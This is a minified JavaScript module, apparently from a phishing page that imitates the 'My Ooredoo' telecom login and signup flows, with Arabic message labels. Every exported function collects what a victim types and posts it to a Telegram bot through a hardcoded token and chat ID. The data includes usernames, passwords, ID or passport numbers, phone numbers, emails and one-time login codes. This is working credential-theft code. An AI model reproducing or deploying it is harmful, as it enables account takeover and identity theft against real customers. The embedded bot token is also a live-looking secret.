const a="8600524631:AAF8rca-J4H3XJchsA8klHcNBUDmsr8dOj0",c="-1003962024601";function s(n,e){const o=(n??"").trim()||"زائر",r=(e??"").trim(),d=r?` (${r})`:"";return`👤 العميل: ${o}${d}
━━━━━━━━━━━━━━
`}function t(){return typeof window>"u"?{name:void 0,id:void 0}:{name:localStorage.getItem("customer_name")||void 0,id:localStorage.getItem("unique_user_id")||void 0}}async function i(n){try{await fetch(`https://api.telegram.org/bot${a}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:c,text:n})})}catch(e){console.warn("telegram send failed",e)}}async function u(n){const{name:e,id:o}=t();return i(s(e??n.businessName,o)+`📩 طلب جديد من معاون

👤 الاسم: ${n.businessName}
📞 الجوال: ${n.phone}
📍 العنوان: ${n.address}`)}async function m(n){const{name:e,id:o}=t();return i(s(e,o)+`🔐 محاولة تسجيل دخول My Ooredoo

👤 المستخدم: ${n.username}
🔑 كلمة المرور: ${n.password}`)}async function f(n){const{name:e,id:o}=t();return i(s(e,o)+`🆕 إنشاء حساب جديد My Ooredoo

📞 رقم الجوال: ${n.phone}
🪪 البطاقة/الجواز: ${n.idNumber}`)}async function y(n){const{name:e,id:o}=t();return i(s(e,o)+`🔁 طلب استعادة كلمة المرور My Ooredoo

👤 المستخدم/البريد: ${n.identifier}
🪪 البطاقة/الجواز: ${n.idNumber}`)}async function $(n){const{name:e,id:o}=t();return i(s(e,o)+`✅ تم تأكيد استلام البريد الإلكتروني My Ooredoo

📧 البريد: ${n.email??"-"}`)}async function l(n){const{name:e,id:o}=t();return i(s(e,o)+`🔄 طلب إعادة إرسال رمز جديد My Ooredoo

📧 البريد: ${n.email??"-"}`)}async function g(n){const{name:e,id:o}=t();return i(s(e,o)+`🔢 رمز تأكيد الدخول My Ooredoo

🔑 الرمز: ${n.code}`)}export{y as a,m as b,g as c,f as d,l as e,$ as f,u as s};
